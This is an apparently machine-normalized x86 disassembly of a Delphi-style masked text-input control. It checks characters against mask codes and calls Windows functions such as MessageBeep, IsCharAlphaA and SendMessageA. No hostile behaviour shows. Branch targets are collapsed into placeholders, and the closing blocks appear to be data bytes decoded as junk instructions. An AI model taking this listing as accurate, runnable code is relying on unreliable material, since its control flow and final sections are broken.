mov eax [ ebx + 0x228 ]
cmp eax [ ebx + 0x230 ]
jge r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_46d594
inc [ ebx + 0x230 ]
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_46d080
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov al [ eax + edx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_46d5b8
jmp r-xdata
mov edx [ ebx + 0x230 ]
mov eax ebx
call sub_46d5b8
jmp r-xdata
dec [ ebx + 0x230 ]
cmp si 0x25
jne r-xdata
xor eax eax
mov [ ebx + 0x230 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
inc eax
mov ecx eax
mov edx eax
mov eax ebx
call sub_46d594
dec [ ebx + 0x230 ]
mov [ ebx + 0x230 ] eax
jmp r-xdata
mov ecx 0x1
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_46dc5c
mov ecx 0x2
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_46dc5c
jmp r-xdata
mov ecx 0x2
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_46dc5c
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_46dc94
jmp r-xdata
sub_46dc5c
push ebx
push esi
push edi
mov edi edx
mov esi eax
lea ebx [ ecx + edi ]
mov edx ebx
mov eax esi
call sub_46dcb0
mov ebx eax
mov edx ebx
mov eax [ esi + 0x220 ]
call sub_46c7ac
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_46d5b8
pop edi
pop esi
pop ebx
retn
mov ebx edi
sub_46dcb0
push ebx
push esi
mov esi eax
mov ebx edx
jmp r-xdata
cmp ebx [ esi + 0x228 ]
jge r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x220 ]
call sub_46c7ac
test al al
jne r-xdata
inc ebx
sub_46dcd8
push ebx
push esi
mov esi eax
mov ebx edx
jmp r-xdata
test ebx ebx
jl r-xdata
test ebx ebx
jge r-xdata
mov edx ebx
mov eax [ esi + 0x220 ]
call sub_46c7ac
test al al
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_46dcb0
mov ebx eax
dec ebx
sub_46dd0c
push ebx
push esi
add esp 0xfffffff4
mov [ esp ] cl
mov esi edx
mov ebx eax
lea ecx [ esp + 0x8 ]
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_46d570
cmp si 0x24
jne r-xdata
test [ esp ] 0x1
je r-xdata
test [ esp ] 0x1
je r-xdata
mov edx [ ebx + 0x228 ]
mov eax ebx
call sub_46d5b8
mov eax [ esp + 0x8 ]
cmp eax [ ebx + 0x230 ]
je r-xdata
xor edx edx
mov eax ebx
call sub_46d5b8
mov eax [ esp + 0x4 ]
cmp eax [ ebx + 0x230 ]
je r-xdata
mov ecx [ ebx + 0x228 ]
mov edx [ esp + 0x4 ]
mov eax ebx
call sub_46d594
mov eax ebx
call sub_46d828
jmp r-xdata
mov eax [ esp + 0x4 ]
inc eax
cmp eax [ esp + 0x8 ]
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov ecx [ esp + 0x8 ]
xor edx edx
mov eax ebx
call sub_46d594
mov eax ebx
call sub_46d828
jmp r-xdata
mov eax [ esp + 0x4 ]
inc eax
cmp eax [ esp + 0x8 ]
je r-xdata
mov eax [ ebx + 0x228 ]
mov [ ebx + 0x230 ] eax
mov eax [ esp + 0x8 ]
dec eax
mov [ esp + 0x4 ] eax
xor eax eax
mov [ ebx + 0x230 ] eax
jmp r-xdata
mov eax [ esp + 0x4 ]
inc eax
mov [ esp + 0x8 ] eax
sub_46dddc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
lea edi [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_46dee8
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x20e ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46deef
lea eax [ ebp - 0xc ]
call sub_403fa4
retn
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax ebx
call sub_46d570
mov eax [ ebp - 0x8 ]
sub eax [ edi ]
dec eax
jg r-xdata
mov eax [ ebp - 0x8 ]
sub eax [ edi ]
dec eax
jl r-xdata
cmp si 0x8
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_46d080
mov eax [ ebp - 0x8 ]
sub eax [ edi ]
push eax
lea edx [ ebp - 0xc ]
mov ecx [ edi ]
mov eax ebx
call sub_46e894
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x8 ]
sub ecx [ edi ]
mov edx [ edi ]
inc edx
mov eax [ ebp - 0xc ]
call sub_4044c4
mov eax [ ebp - 0xc ]
call sub_404464
push eax
push 0x0
push 0xc2
mov eax ebx
call sub_4507d8
push eax
call SendMessageA
mov eax [ ebp - 0x8 ]
sub eax [ edi ]
dec eax
je r-xdata
mov esi [ edi ]
mov edx [ edi ]
mov eax ebx
call sub_46dc94
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax ebx
call sub_46d570
cmp esi [ edi ]
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax ebx
call sub_46d570
mov edx [ edi ]
dec edx
mov eax ebx
call sub_46d5b8
mov edx [ edi ]
mov eax ebx
call sub_46dcb0
mov [ edi ] eax
mov edx [ edi ]
mov eax ebx
call sub_46d5b8
jmp r-xdata
sub_46def8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46df7b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_46d398
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_440db4
test [ ebx + 0x1c ] 0x10
jne r-xdata
test [ ebx + 0x22d ] 0x2
jne r-xdata
and [ ebx + 0x22d ] 0xfd
mov eax ebx
call sub_46d828
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_46d080
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x238 ]
call sub_403ff8
mov edx esi
mov eax ebx
call sub_440db4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46df82
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
sub_46df88
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_46e009
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_440df0
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_46d080
mov edx [ ebp - 0xc ]
lea eax [ ebx + 0x238 ]
call sub_403ff8
mov eax ebx
call sub_450adc
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e010
lea eax [ ebp - 0xc ]
call sub_403fa4
retn
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_46d570
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_46dcb0
cmp eax [ ebp - 0x4 ]
je r-xdata
mov edx eax
mov eax ebx
call sub_46d5b8
sub_46e018
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x4 ] 0x1b
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_46d398
test al al
je r-xdata
mov eax ebx
call sub_440634
test al al
je r-xdata
mov [ esi + 0xc ] 0x1
sub_46e050
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_46d398
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_44fbc8
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xf8 ]
mov eax ebx
call sub_46d828
sub_46e084
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_46e116
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_46d080
mov eax esi
call sub_46d398
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e11d
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
mov eax esi
call sub_440634
test al al
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xf0 ]
test al al
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_46d5b8
mov eax esi
mov edx [ eax ]
call [ edx + 0xf4 ]
or [ esi + 0x22d ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_46e124
push ebx
add esp 0xfffffff8
mov ebx eax
push 0x0
call MessageBeep
mov eax [ ebx + 0x220 ]
mov [ esp ] eax
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd20
call sub_4039e0
pop ecx
pop edx
pop ebx
retn
sub_46e160
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
push edi
mov cl [ ebx + 0x224 ]
mov edx esi
mov eax [ ebx + 0x220 ]
call sub_46c364
push edi
mov cl 0x20
mov edx esi
mov eax [ ebx + 0x220 ]
call sub_46c364
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_46e1a8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x18 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46e36e
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xc ] 0x1
mov eax esi
mov edx ebx
call sub_403ff8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
call sub_404264
mov ebx eax
test ebx ebx
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx 0x1
call sub_46c2c8
mov ebx eax
test bl 0x1
je r-xdata
mov edi 0x1
mov eax [ esi ]
call sub_404264
mov [ ebp - 0x8 ] eax
mov ebx [ ebp - 0x8 ]
test ebx ebx
jle r-xdata
mov [ ebp - 0xc ] 0x1
mov eax [ esi ]
call sub_404264
mov ebx eax
test ebx ebx
jle r-xdata
mov al [ ebp - 0xd ]
add al 0xfc
sub al 0x2
jae r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov eax [ esi ]
call sub_404264
mov ecx eax
sub ecx [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
inc edx
mov eax [ esi ]
call sub_4044c4
mov eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0xc ]
dec ecx
mov eax [ esi ]
mov edx 0x1
call sub_4044c4
mov edx [ ebp - 0x18 ]
mov eax esi
pop ecx
call sub_4042b0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x224 ] 0x20
je r-xdata
mov edi 0x1
cmp [ ebp - 0xc ] 0x1
je r-xdata
mov edi 0x1
inc edi
dec ebx
jne r-xdata
inc [ ebp - 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e375
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_403fc8
retn
mov eax [ esi ]
call sub_404264
mov [ ebp - 0x8 ] eax
mov ebx [ ebp - 0x8 ]
test ebx ebx
jle r-xdata
mov eax [ esi ]
call sub_404264
mov edx eax
dec edx
mov eax esi
call sub_4045f0
inc edi
dec ebx
jne r-xdata
push esi
mov eax [ esi ]
call sub_404264
mov ecx eax
sub ecx [ ebp - 0xc ]
inc ecx
mov eax [ esi ]
mov edx [ ebp - 0xc ]
call sub_4044c4
jmp r-xdata
inc [ ebp - 0xc ]
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx edi
call sub_46c174
mov [ ebp - 0xd ] al
mov al [ ebp - 0xd ]
dec eax
sub al 0x2
jae r-xdata
mov edi 0x1
mov eax [ ebp - 0x8 ]
sub eax edi
mov edx [ esi ]
mov al [ edx + eax ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x224 ]
jne r-xdata
mov eax [ esi ]
mov al [ eax + edi - 0x1 ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x224 ]
jne r-xdata
cmp edi [ ebp - 0x8 ]
jg r-xdata
mov eax esi
call j_sub_404470#2
mov [ eax + edi - 0x1 ] 0x20
inc edi
dec ebx
jne r-xdata
mov eax [ esi ]
mov al [ eax + edi - 0x1 ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x224 ]
jne r-xdata
sub_46e37c
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov ebp edx
mov esi eax
mov bl 0x1
cmp [ esi + 0x220 ] 0x0
je r-xdata
test bl bl
jne r-xdata
xor ebx ebx
mov edx edi
mov eax [ esi + 0x220 ]
call sub_46c750
mov edi eax
test edi edi
jl r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
push 0x0
call MessageBeep
mov edx edi
mov eax [ esi + 0x220 ]
call sub_46c174
mov [ esp ] al
mov al [ ebp ]
mov [ esp + 0x1 ] al
mov edx ebp
mov ecx edi
mov eax esi
call sub_46e510
mov ebx eax
test bl bl
jne r-xdata
mov al [ esp ]
add al 0xfc
sub al 0x2
jae r-xdata
mov cl [ esp + 0x1 ]
mov edx edi
mov eax esi
call sub_46ebf0
mov edi eax
test edi edi
jle r-xdata
mov edx edi
mov eax [ esi + 0x220 ]
call sub_46c6fc
mov edi eax
mov edx edi
mov eax esi
call sub_46d5b8
jmp r-xdata
sub_46e430
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
xor eax eax
push ebp
push sub_46e4fe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ esi ]
mov eax [ eax + 0x220 ]
call sub_46c6fc
mov ebx eax
mov eax [ esi ]
mov eax [ eax + 0x220 ]
call sub_404264
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x8 ]
jle r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ esi ]
mov edx [ edx + 0x220 ]
mov al [ edx + eax - 0x1 ]
call sub_402a00
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ esi ]
mov edx [ edx + 0x220 ]
mov al [ edx + eax ]
call sub_402a00
pop edx
cmp dl al
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ esi ]
call sub_46d080
mov eax [ ebp - 0x4 ]
mov edx ebx
call sub_40c624
cmp al 0x2
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ esi ]
call sub_46d080
mov eax [ ebp - 0x8 ]
lea edx [ ebx + 0x1 ]
call sub_40c624
cmp al 0x1
je r-xdata
xor eax eax
jmp r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e505
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fc8
retn
sub_46e510
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46e7c2
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
call sub_46c174
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
call sub_46c2c8
mov [ ebp - 0xa ] al
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
movzx eax [ eax + edx - 0x1 ]
cmp eax 0x43
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
mov al [ eax + edx - 0x1 ]
call sub_46c344
mov [ ebx ] al
jmp r-xdata
sub eax 0x4c
je r-xdata
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e7c9
lea eax [ ebp - 0x20 ]
mov edx 0x5
call sub_403fc8
retn
mov al [ ebx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
sub eax 0x15
je r-xdata
mov al [ ebx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
sub eax 0x23
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_40403c
lea eax [ ebp - 0x10 ]
call j_sub_404470#2
mov dl [ ebx ]
mov [ eax ] dl
mov al [ ebx ]
call sub_46e418
test al al
je r-xdata
push ebp
mov al [ ebx ]
call sub_46e430
pop ecx
test al al
je r-xdata
sub eax 0x2
je r-xdata
mov al [ ebx ]
push eax
call IsCharAlphaA
test eax eax
je r-xdata
push ebp
mov al [ ebx ]
call sub_46e430
pop ecx
test al al
je r-xdata
cmp [ ebx ] 0x30
jb r-xdata
sub eax 0xd
je r-xdata
mov al [ ebx ]
push eax
call IsCharAlphaA
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax ]
mov [ ebx ] al
jmp r-xdata
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
sub eax 0x9
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_40403c
lea eax [ ebp - 0x10 ]
call j_sub_404470#2
mov dl [ ebx ]
mov [ eax ] dl
test [ ebp - 0xa ] 0x2
je r-xdata
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
cmp [ ebx ] 0x20
je r-xdata
cmp [ ebx ] 0x39
jbe r-xdata
cmp [ ebx ] 0x30
jb r-xdata
sub eax 0x9
je r-xdata
test [ ebp - 0xa ] 0x2
je r-xdata
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
cmp [ eax + edx - 0x1 ] 0x41
je r-xdata
jmp r-xdata
test [ ebp - 0xa ] 0x4
je r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
call sub_4081f8
mov edx [ ebp - 0x14 ]
lea eax [ ebp - 0x10 ]
call sub_40403c
jmp r-xdata
cmp [ ebx ] 0x2b
je r-xdata
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
cmp [ ebx ] 0x39
jbe r-xdata
sub eax 0x8
je r-xdata
test [ ebp - 0xa ] 0x4
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x10 ]
call sub_4081f8
mov edx [ ebp - 0x1c ]
lea eax [ ebp - 0x10 ]
call sub_40403c
jmp r-xdata
mov al [ ebx ]
push eax
call IsCharAlphaNumericA
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
cmp [ eax + edx - 0x1 ] 0x61
jne r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax ]
mov [ ebx ] al
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x10 ]
call sub_40822c
mov edx [ ebp - 0x18 ]
lea eax [ ebp - 0x10 ]
call sub_40403c
cmp [ ebx ] 0x2d
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax ]
mov [ ebx ] al
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x10 ]
call sub_40822c
mov edx [ ebp - 0x20 ]
lea eax [ ebp - 0x10 ]
call sub_40403c
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
sub_46e7d7
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov [ esp + 0x8 ] 0x1
mov [ esp + 0xc ] 0x1
mov eax [ ebp + 0x220 ]
call sub_404264
mov esi eax
test esi esi
jle r-xdata
mov al [ esp + 0x8 ]
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi 0x1
inc [ esp + 0xc ]
jmp r-xdata
sub al 0x2
jne r-xdata
inc edi
dec esi
jne r-xdata
cmp bl 0x4
jne r-xdata
mov eax [ ebp + 0x220 ]
mov edx edi
call sub_46c174
mov ebx eax
mov eax ebx
dec eax
sub al 0x2
jb r-xdata
cmp [ esp ] 0x0
je r-xdata
mov eax [ esp ]
mov edx [ esp + 0xc ]
mov al [ eax + edx - 0x1 ]
cmp al [ ebp + 0x224 ]
je r-xdata
mov [ esp + 0x8 ] 0x0
mov eax [ esp + 0xc ]
dec eax
mov edx [ esp + 0x4 ]
mov [ edx ] eax
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0xc ]
cmp [ eax + edx - 0x1 ] 0x20
jne r-xdata
inc [ esp + 0xc ]
mov eax [ ebp + 0x220 ]
cmp [ eax + edi - 0x1 ] 0x43
je r-xdata
sub_46e894
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x9 ] 0x1
test eax eax
je r-xdata
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ebx [ ebp - 0x8 ]
inc ebx
add eax ebx
mov [ ebp - 0x10 ] eax
mov eax [ edi + 0x220 ]
mov edx [ ebp - 0x8 ]
call sub_46c750
mov esi eax
test esi esi
jl r-xdata
mov eax [ edi + 0x220 ]
call sub_404264
sub eax esi
jl r-xdata
inc eax
xchg esi eax
mov [ ebp - 0x14 ] eax
add al 0xfc
sub al 0x2
jae r-xdata
inc ebx
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
call j_sub_404470#2
mov dl [ edi + 0x224 ]
mov [ eax + ebx - 0x1 ] dl
inc ebx
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
mov eax [ edi + 0x220 ]
mov edx [ ebp - 0x14 ]
call sub_46c174
mov edx eax
dec edx
sub dl 0x2
jae r-xdata
sub_46e92c
push ebp
mov ebp esp
push ecx
mov ecx 0x6
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_46ebdc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ebe3
lea eax [ ebp - 0x34 ]
mov edx 0x8
call sub_403fc8
lea eax [ ebp - 0x10 ]
call sub_403fa4
retn
mov ebx 0x1
lea eax [ ebp - 0x10 ]
mov edx edi
call sub_40403c
mov edx [ ebp + 0x8 ]
mov eax [ esi + 0x220 ]
call sub_46c750
mov edi eax
test edi edi
jl r-xdata
jmp r-xdata
mov eax [ esi + 0x220 ]
call sub_404264
cmp edi eax
jle r-xdata
mov edx edi
mov eax [ esi + 0x220 ]
call sub_46c174
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
dec eax
sub al 0x2
jb r-xdata
mov eax [ ebp - 0x10 ]
call sub_404264
add eax [ ebp + 0x8 ]
cmp eax [ esi + 0x228 ]
jge r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax + ebx - 0x1 ]
mov [ ebp - 0x11 ] al
lea edx [ ebp - 0x11 ]
mov ecx edi
mov eax esi
call sub_46e510
test al al
jne r-xdata
dec eax
sub al 0x2
jae r-xdata
mov edi [ ebp + 0x8 ]
mov edx [ esi + 0x228 ]
sub edx [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_40c624
cmp al 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_404264
mov edx eax
add edx [ ebp + 0x8 ]
inc edx
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_40c624
cmp al 0x2
jne r-xdata
mov al [ ebp - 0x9 ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ rw-data ]
mov dl [ ebp - 0x11 ]
and edx 0xff
bt [ eax ] edx
jae r-xdata
mov eax [ ebp + 0x8 ]
add eax ebx
cmp eax [ esi + 0x228 ]
jg r-xdata
lea eax [ ebp - 0x30 ]
push eax
mov ecx [ esi + 0x228 ]
sub ecx edi
mov edx 0x1
mov eax [ ebp - 0x10 ]
call sub_4044c4
mov eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov ecx [ ebp + 0x8 ]
mov edx 0x1
call sub_4044c4
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
pop ecx
call sub_4042b0
inc edi
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov ecx [ ebp + 0x8 ]
mov edx 0x1
call sub_4044c4
push [ ebp - 0x28 ]
push [ ebp - 0x10 ]
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x10 ]
call sub_404264
add eax [ ebp + 0x8 ]
mov edx [ esi + 0x228 ]
sub edx eax
push edx
mov eax [ ebp - 0x10 ]
call sub_404264
mov edx eax
add edx [ ebp + 0x8 ]
inc edx
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
pop ecx
call sub_4044c4
push [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov edx 0x3
call sub_404324
jmp r-xdata
lea eax [ ebp - 0x24 ]
mov dl [ esi + 0x224 ]
call sub_40418c
mov edx [ ebp - 0x24 ]
lea eax [ ebp - 0x10 ]
call sub_40426c
inc ebx
lea eax [ ebp - 0x10 ]
call j_sub_404470#2
mov dl [ ebp - 0x11 ]
mov [ eax + ebx - 0x1 ] dl
mov eax [ rw-data ]
mov dl [ ebp - 0x11 ]
and edx 0xff
bt [ eax ] edx
jae r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax + ebx - 0x1 ]
cmp al [ ebp - 0x11 ]
jne r-xdata
mov al [ esi + 0x224 ]
mov [ ebp - 0x11 ] al
lea eax [ ebp - 0x10 ]
call j_sub_404470#2
mov dl [ esi + 0x224 ]
mov [ eax + ebx ] dl
mov eax [ ebp - 0x10 ]
call sub_404264
cmp eax ebx
jl r-xdata
add ebx [ ebp + 0x8 ]
dec ebx
mov [ ebp - 0x8 ] ebx
inc ebx
inc ebx
inc edi
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ ebp - 0x10 ]
call sub_4044c4
push [ ebp - 0x18 ]
lea eax [ ebp - 0x1c ]
mov dl [ ebp - 0x11 ]
call sub_40418c
push [ ebp - 0x1c ]
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_404264
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x10 ]
call sub_4044c4
push [ ebp - 0x20 ]
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_404324
inc edi
sub_46ebf0
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov edi edx
mov esi eax
or ebp 0xffffffff
jmp r-xdata
mov eax [ esi + 0x220 ]
call sub_404264
cmp edi eax
jl r-xdata
inc edi
mov edx edi
mov eax [ esi + 0x220 ]
call sub_46c174
mov edx eax
dec edx
sub dl 0x2
jae r-xdata
mov eax ebp
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ esi + 0x220 ]
mov dl [ edx + edi - 0x1 ]
cmp al 0x2
jne r-xdata
cmp bl dl
jne r-xdata
mov eax edx
call sub_46c344
mov edx eax
mov ebp edi
jmp r-xdata
sub_46ec4c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46ec71
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ec78
retn
sub_46ec88
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shr ah 0x1
inc esi
add [ eax + eax ] cl
add [ eax ] al
sbb al 0x74
inc eax
add [ esp + esi + 0x34a80040 ] bl
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
